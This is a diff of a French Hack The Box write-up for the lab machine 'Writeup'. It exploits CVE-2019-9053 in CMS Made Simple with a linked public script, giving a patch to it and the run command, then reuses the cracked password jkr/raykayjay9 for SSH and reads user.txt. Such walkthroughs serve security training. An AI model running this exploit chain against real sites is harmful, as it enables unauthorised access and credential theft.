@@ -420,33 +420,104 @@ La balise `Generator` permet d’identifier sans ambiguïté le CMS utilisé : *
 
 ### CMS Made Simple
 
+Une fois le CMS identifié comme **CMS Made Simple**, tu peux rechercher les vulnérabilités connues affectant ses versions anciennes. Une recherche simple du type *“CMS Made Simple unauthenticated SQL injection”* ou *“CMS Made Simple CVE exploit”* permet de mettre rapidement en évidence la vulnérabilité **CVE-2019-9053**, une injection SQL non authentifiée dans le module *News*. Cette recherche mène notamment à des exploits publics, comme la version Python 3 disponible ici :
+ https://github.com/Dh4nuJ4/SimpleCTF-UpdatedExploit/blob/main/updated_46635.py
 
+> Sous Python 3, l’exploit échoue lors du cracking à cause de l’encodage de `rockyou.txt`. 
+>
+> Il faut donc **remplacer ceci** :
 
-Voici une vue de l'exécution de l'exploit
+```python
+with open(wordlist, 'r') as dict:
+```
+
+> **par** :
+
+```python
+with open(wordlist, 'r', encoding='latin-1', errors='ignore') as dict:
+```
+
+La version corrigée est disponible ici: [my_updated_46635.py](files/my_updated_46635.py)
+
+Tu peux maintenant lancer l'exploit :
+
+```bash
+python3 my_updated_46635.py -u http://writeup.htb/writeup/ --crack -w /usr/share/wordlists/rockyou.txt
+```
+
+Voici une vue de l'exécution de l'exploit :
 
 ![mon terminal](files/exploit.gif)
 
-```
-[+] Salt for password found: 5a599ef579066807
-[+] Username found: jkr
-[+] Email found: jkr@writeup.htb
-[+] Password found: 62def4866937f08cc13bab43bb14e6f7
-[+] Password cracked: raykayjay9
+> Le GIF présenté ici est accéléré pour que tu puisses suivre plus facilement les étapes. En pratique, l’exécution réelle de l’exploit est beaucoup plus lente et prend environ **5 minutes**, car il teste les informations caractère par caractère à l’aide de délais volontairement introduits (*time-based*).
 
-```
+Maintenant que tu disposes du couple **jkr / raykayjay9** valide, tu peux l’utiliser pour te connecter en **SSH** à la machine et obtenir ton premier accès interactif.
 
-
-
-<details>
-  <summary>Voir la démo du terminal</summary>
-
-  <video controls preload="metadata" width="100%">
-    <source src="files/exploit.webm" type="video/mp4">
-  </video>
-</details>
+> Même si l’exploit te fournit au départ un identifiant et un mot de passe pour le CMS, il est très courant sur HTB que ces mêmes identifiants fonctionnent aussi pour une connexion **SSH**. C’est pourquoi il est toujours utile de les tester immédiatement pour accéder à la machine.
 
 
 ---
+
+### Connexion SSH
+
+```bash
+ssh jkr@writeup.htb
+
+jkr@writeup.htb's password: 
+Linux writeup 6.1.0-13-amd64 x86_64 GNU/Linux
+
+The programs included with the Devuan GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Oct 25 11:04:00 2023 from 10.10.14.23
+jkr@writeup:~$
+```
+
+### user.txt
+
+Une fois connecté en SSH, il est toujours recommandé de vérifier immédiatement **qui tu es**, **où tu te trouves** et **à quels groupes tu appartiens**. Ces informations de base permettent de confirmer l’accès obtenu et de préparer la suite de l’énumération locale.
+
+```bash
+whoami
+pwd
+groups
+ls -la
+```
+
+C’est une étape simple, systématique, et essentielle après tout premier accès à une machine.
+
+```bash
+jkr@writeup:~$ whoami
+jkr
+jkr@writeup:~$ pwd
+/home/jkr
+jkr@writeup:~$ groups
+jkr cdrom floppy audio dip video plugdev staff netdev
+jkr@writeup:~$
+```
+
+puis tu fais ton `ls -l`a et **là, tu trouves le `user.txt`**
+
+```bash
+jkr@writeup:~$ ls -la
+total 24
+drwxr-xr-x 2 jkr  jkr  4096 Apr 19  2019 .
+drwxr-xr-x 3 root root 4096 Apr 19  2019 ..
+lrwxrwxrwx 1 root root    9 Apr 19  2019 .bash_history -> /dev/null
+-rw-r--r-- 1 jkr  jkr   220 Apr 19  2019 .bash_logout
+-rw-r--r-- 1 jkr  jkr  3526 Apr 19  2019 .bashrc
+-rw-r--r-- 1 jkr  jkr   675 Apr 19  2019 .profile
+-r--r--r-- 1 root root   33 Jan 14 03:57 user.txt
+
+jkr@writeup:~$ cat user.txt
+0b4cxxxxxxxxxxxxxxxxxxxxxxxx3946
+jkr@writeup:~$
+```
+
+
 
 ## Escalade de privilèges
 
